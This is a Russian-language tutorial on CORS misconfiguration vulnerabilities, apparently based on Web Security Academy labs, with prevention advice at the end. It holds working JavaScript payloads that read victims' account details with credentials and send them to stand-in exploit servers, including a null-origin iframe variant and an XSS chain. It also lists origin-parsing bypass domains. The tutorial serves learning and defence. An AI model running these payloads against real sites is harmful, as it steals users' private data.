# **CORS (client)**

> **Cross-origin resource sharing (CORS)** — это механизм браузера, который обеспечивает контролируемый доступ к ресурсам, расположенным за пределами заданного домена. Он расширяет и добавляет гибкости политике одного и того же источника (SOP). Однако он также предоставляет потенциал для cross-domain атак, если политика CORS веб-сайта плохо настроена и реализована. CORS не является защитой от cross-origin атак, таких как подделка межсайтовых запросов (CSRF).

> **Origin** — это адрес, с которого отправлен запрос. Он состоит из протокола, домена и порта. Его отправляют в заголовке HTTP-запроса.

> **Site** — он же «сайт» — это комбинация домена верхнего уровня и поддомена первого уровня. Проще говоря, корневой домен сайта.

> **Политика одного источника (SOP)** — это механизм безопасности веб-браузера, который направлен на предотвращение атак веб-сайтов друг на друга.

> Согласно SOP, скрипт с одного сайта может посылать POST- и GET-запросы на другой сайт. Но ответ он прочитать не сможет: у них разные origin, поэтому чтение ответа будет заблокировано на уровне браузера.
Остальные виды запросов — например, DELETE или PUT — SOP не пропустит в принципе. Они не дойдут до сервера.
SOP определяет права доступа на основе origin.

# **CORS и заголовки**

* **Access-Control-Allow-Origin**
	* Заголовок Access-Control-Allow-Origin включается в ответ одного веб-сайта на запрос, исходящий с другого веб-сайта, и определяет разрешенный источник запроса. Веб-браузер сравнивает Access-Control-Allow-Origin с источником запрашивающего веб-сайта и разрешает доступ к ответу, если они совпадают.
	* Спецификация Access-Control-Allow-Origin допускает несколько источников, или значение null, или подстановочный знак *. Однако ни один браузер не поддерживает несколько источников, и существуют ограничения на использование подстановочного знака *

* **Access-Control-Allow-Credentials**
  * Значение true - если запрашивающий веб-сайт использует JavaScript для объявления отправки файлов cookie с запросом, браузер разрешит запрашивающему веб-сайту прочитать ответ.


# Уязвимости, возникающие из-за проблем с конфигурацией CORS

* **Сгенерированный сервером заголовок ACAO из указанного клиентом заголовка Origin**

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

* **Ошибки при анализе заголовков источника**

* Приложение предоставляет доступ ко всем доменам, заканчивающимся на
normal-website.com
```
Можно получить доступ, зарегистрировав домен:
hackersnormal-website.com
```

* Приложение предоставляет доступ ко всем доменам, начинающимся с
normal-website.com
```
Можно получить доступ, используя домен:
normal-website.com.evil-user.net
```

* **Белый список пустого источника**

Спецификация заголовка Origin поддерживает значение null. Браузеры могут отправлять значение null в заголовке Origin в различных необычных ситуациях:

* Перенаправления между источниками.
* Запросы из сериализованных данных.
* Запросы с использованием протокола file:.
* Запросы между источниками в изолированной среде.
  
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','target-domain.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
* **Эксплуатация XSS через доверительные отношения CORS**

* Если веб-сайт доверяет источнику, который уязвим для межсайтового скриптинга (XSS), можно использовать XSS для внедрения некоторого JavaScript, который использует CORS для получения конфиденциальной информации с сайта, который доверяет уязвимому приложению.

* **Взлом TLS с плохо настроенным CORS**

<script>
    document.location="http://victim-server.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim-server/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://my.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

* **Интрасети и CORS без учетных данных**

Большинство атак CORS полагаются на наличие заголовка ответа:
Access-Control-Allow-Credentials: true

Когда cайт является частью интрасети организации и расположен в частном пространстве IP-адресов, нет возможности получить доступ к нему напрямую. Внутренние веб-сайты часто имеют более низкий стандарт безопасности, чем внешние сайты, что позволяет находить уязвимости и получать дополнительный доступ. 

* Например, запрос кросс-источника в частной сети может быть следующим:

GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com

И сервер отвечает:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

Сервер приложений доверяет запросам ресурсов из любого источника без учетных данных. 

Если пользователи в частном пространстве IP-адресов получают доступ к общедоступному Интернету, то атака на основе CORS может быть выполнена с внешнего сайта, который использует браузер жертвы в качестве прокси-сервера для доступа к ресурсам интрасети.

# Как предотвратить атаки на основе CORS

Уязвимости CORS возникают в первую очередь из-за неправильных конфигураций.

* Правильная настройка запросов кросс-источника
Если веб-ресурс содержит конфиденциальную информацию, источник должен быть правильно указан в заголовке Access-Control-Allow-Origin.
* Разрешать только доверенные сайты
Это может показаться очевидным, но источники, указанные в заголовке Access-Control-Allow-Origin, должны быть только доверенными сайтами. В частности, динамическое отражение источников из запросов кросс-источника без проверки легко эксплуатируется и его следует избегать.
* Избегайте внесения null в белый список
Избегайте использования заголовка Access-Control-Allow-Origin: null. Вызовы ресурсов кросс-источника из внутренних документов и изолированных запросов могут указывать на нулевой источник. Заголовки CORS должны быть правильно определены в отношении доверенных источников для частных и публичных серверов.
* Избегайте подстановочных знаков во внутренних сетях.
Избегайте использования подстановочных знаков во внутренних сетях. Доверия конфигурации сети для защиты внутренних ресурсов недостаточно, когда внутренние браузеры могут получать доступ к ненадежным внешним доменам.
* CORS не заменяет политики безопасности на стороне сервера
CORS определяет поведение браузера и никогда не заменяет защиту конфиденциальных данных на стороне сервера — злоумышленник может напрямую подделать запрос из любого доверенного источника. Поэтому веб-серверы должны продолжать применять защиту конфиденциальных данных, такую ​​как аутентификация и управление сеансами, в дополнение к правильно настроенному CORS.
